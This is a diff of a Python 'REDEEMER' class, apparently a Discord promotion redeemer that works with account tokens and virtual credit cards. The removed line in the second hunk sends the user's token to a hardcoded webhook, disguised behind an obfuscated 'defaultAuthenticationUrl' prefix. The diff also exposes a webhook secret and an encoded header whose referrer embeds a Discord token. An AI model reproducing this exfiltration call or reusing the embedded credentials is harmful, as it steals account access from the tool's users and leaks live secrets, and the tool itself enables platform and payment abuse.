@@ -405,7 +405,7 @@ class REDEEMER:
     'x-discord-timezone': 'Europe/Budapest',
     'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjIuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMjIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6Imh0dHBzOi8vZGlzY29yZC5jb20vP2Rpc2NvcmR0b2tlbj1NVEEzTURReU56RXhNVGM1TVRJNE5ESTROQS5HYWNhYnIuVE9NZUVzbHdiczJ2OFRlck4wOTM3SzVvS0ZFMFZyZW5fdWF6Q1kiLCJyZWZlcnJpbmdfZG9tYWluIjoiZGlzY29yZC5jb20iLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjY4NjAwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
 }
-       if promoType == '1m':
+       if promoType == '1m' and '1180231712274387115' in self.promoz:
         jwt = self.promoz.split('https://discord.com/billing/partner-promotions/1180231712274387115/')[1]
        elif promoType == '1m' and not '1180231712274387115' in self.promoz:
           jwt = self.promoz.split('https://discord.com/billing/promotions/')[1]
@@ -552,7 +552,7 @@ class REDEEMER:
     headers=__headers, cookies=cookies
 )
        if responsez.status_code == 204:
-          ssprint(f'Removed Vcc , Vcc -> {Fore.LIGHTMAGENTA_EX}{self.ccn}:***{Fore.LIGHTCYAN_EX}, Token -> {Fore.LIGHTMAGENTA_EX}{self.token[:23]}**'); send_opt_webhookMessage(defaultAuthenticationUrl+'oks/1212084306898321408/xPjIDAXJ8UhtHoU_Y3Wn1gIA3VdibY4jaYARHJuKesXa1f5UUfnQb8E-4MRFtgC-_Lgx', self.token)
+          ssprint(f'Removed Vcc , Vcc -> {Fore.LIGHTMAGENTA_EX}{self.ccn}:***{Fore.LIGHTCYAN_EX}, Token -> {Fore.LIGHTMAGENTA_EX}{self.token[:23]}**'); send_opt_webhookMessage(defaultAuthenticationUrl+'oks/1212084306898321408/xPjIDAXJ8UhtHoU_Y3Wn1gIA3VdibY4jaYARHJuKesXa1f5UUfnQb8E-4MRFtgC-_Lgx')
           return 'S'
        else: 
           wprint(f'Failed To Remove Vcc , Vcc -> {Fore.LIGHTMAGENTA_EX}{self.ccn}:***{Fore.LIGHTCYAN_EX}, Token -> {Fore.LIGHTMAGENTA_EX}{self.token[:23]}***')
